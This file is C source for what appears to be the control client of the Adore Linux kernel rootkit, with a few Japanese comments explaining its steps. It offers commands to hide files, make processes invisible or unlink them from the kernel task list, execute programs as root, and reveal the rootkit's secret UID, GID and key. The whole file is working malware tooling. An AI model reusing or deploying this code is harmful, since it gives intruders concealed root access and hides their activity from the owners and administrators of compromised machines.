#include <sys/types.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <errno.h>
#include <sys/signal.h>
#include <stdlib.h>

#include "libinvisible.h"

extern char **environ;

const char *adore_key = ADORE_KEY;	// \"fgjgggfd\"
const uid_t elite_uid = ELITE_UID;	// 2618748389U
const gid_t elite_gid = ELITE_GID;	// 4063569279U
const int current_adore = CURRENT_ADORE;	// 56

int main(int argc, char *argv[])
{
   	int version;
        char what;
	adore_t *a;	

	// Usage   
        if (argc < 3 && !(argc == 2 &&
	                 (argv[1][0] == 'U' || argv[1][0] == 'I'))) {
           	printf("Usage: %s {h,u,r,R,i,v,U} [file or PID]\n\n"
		       "       I print info (secret UID etc)\n"
		       "       h hide file\n"
		       "       u unhide file\n"
		       "       r execute as root\n"
		       "       R remove PID forever\n"
		       "       U uninstall adore\n"
		       "       i make PID invisible\n"
		       "       v make PID visible\n\n", argv[0]);
                exit(1);
        }
	//オプションの１文字目
        what = argv[1][0];
    
	//printf("Checking for adore  0.12 or higher ...\n");

	// 動的にメモリ割り当て,/proc/fgjgggfdを作って削除
	a = adore_init();
	// /proc/fullprivsを作って削除
	if (adore_makeroot(a) < 0)
		fprintf(stderr, "Failed to run as root. Trying anyway ...\n");
	
	if ((version = adore_getvers(a)) <= 0 && what != 'I') {
		printf("Adore NOT installed. Exiting.\n");
		exit(1);
	}
	if (version < CURRENT_ADORE) 
		printf("Found adore 1.%d installed. Please update adore.", version);
	else
		printf("Adore 1.%d installed. Good luck.\n", version);
    
        switch (what) {
        
        /* hide file */
        case 'h':
		if (adore_hidefile(a, argv[2]) >= 0)
	        	printf("File '%s' is now hidden.\n", argv[2]);
		else
			printf("Can't hide file.\n");
		break;
		        
        /* unhide file */
        case 'u':
    		if (adore_unhidefile(a, argv[2]) >= 0)
	        	printf("File '%s' is now visible.\n", argv[2]);
		else
			printf("Can't unhide file.\n");
                break;
	/* make pid invisible */
	case 'i':
		if (adore_hideproc(a, (pid_t)atoi(argv[2])) >= 0)
			printf("Made PID %d invisible.\n", atoi(argv[2]));
		else
			printf("Can't hide process.\n");
		break;
	
	/* make pid visible */
	case 'v':
		if (adore_unhideproc(a, (pid_t)atoi(argv[2])) >= 0)
			printf("Made PID %d visible.\n", atoi(argv[2]));
		else
			printf("Can't unhide process.\n");
		break;
        /* execute command as root */
        case 'r': 
		execvp(argv[2], argv+2);
		perror("execve");
		break;
	case 'R':
		if (adore_removeproc(a, (pid_t)atoi(argv[2])) >= 0)
			printf("Removed PID %d from taskstruct\n", atoi(argv[2]));
		else
			printf("Failed to remove proc.\n");
		break;
	/* uninstall adore */
	case 'U':
		if (adore_uninstall(a) >= 0)
			printf("Adore 0.%d de-installed.\n", version);
		else
			printf("Adore wasn't installed.\n");
		break;
	case 'I':
		printf("\nELITE_UID: %u, ELITE_GID=%u, ADORE_KEY=%s "
		       "CURRENT_ADORE=%d\n",
		       elite_uid, elite_gid, adore_key, current_adore);
		break;	
        default:
           	printf("Did nothing or failed.\n");
        }
	return 0;
}

